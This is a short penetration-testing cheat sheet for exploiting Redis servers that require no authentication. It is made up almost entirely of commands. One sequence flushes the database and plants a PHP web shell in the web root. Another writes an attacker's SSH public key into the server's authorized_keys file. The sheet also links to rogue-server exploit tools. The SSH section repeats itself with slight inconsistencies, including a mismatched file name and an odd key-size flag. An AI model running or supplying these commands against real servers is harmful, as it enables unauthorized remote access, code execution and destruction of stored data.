


### Passwordless Authentication
```
redis-cli -h 192.168.217.176
```



### Exploiting Redis for Remote Code Execution

```
redis-cli -h X.X.X.X flushall
redis-cli -h X.X.X.X set pwn '<?php system($_REQUEST['cmd']); ?>'
redis-cli -h X.X.X.X config set dbfilename shell.php
redis-cli -h X.X.X.X config set dir /var/www/html
redis-cli -h X.X.X.X save
```


### Unauthorized SSH Access via Redis Exploitation

https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419


```
ssh-keygen -t ecdsa -s 521 -f key // OR
ssh-keygen -t rsa
cd ~/.ssh/
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt


(echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
redis-cli -h X.X.X.X flushall
cat foo.txt | redis-cli -h X.X.X.X -x set pwn
redis-cli -h X.X.X.X config set dbfilename authorized_keys
redis-cli -h X.X.X.X config set dir /var/lib/redis/.ssh
redis-cli -h X.X.X.X save
```
### Unauthorized SSH Access via Redis Exploitation

This set of commands demonstrates an exploitation method that uses Redis to insert an SSH public key into the authorized_keys file of a Redis server, effectively allowing unauthorized SSH access to the server.

```
$ ssh-keygen -t ecdsa -s 521 -f key$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
$ redis-cli -h X.X.X.X flushall
$ cat key.txt | redis-cli -h X.X.X.X -x set pwn
$ redis-cli -h X.X.X.X config set dbfilename authorized_keys
$ redis-cli -h X.X.X.X config set dir /var/lib/redis/.ssh
$ redis-cli -h X.X.X.X save
```
### Rogue Redis Server

[+]
https://github.com/n0b0dyCN/redis-rogue-server

[-]
https://github.com/Dliv3/redis-rogue-server/blob/master/README_EN.md

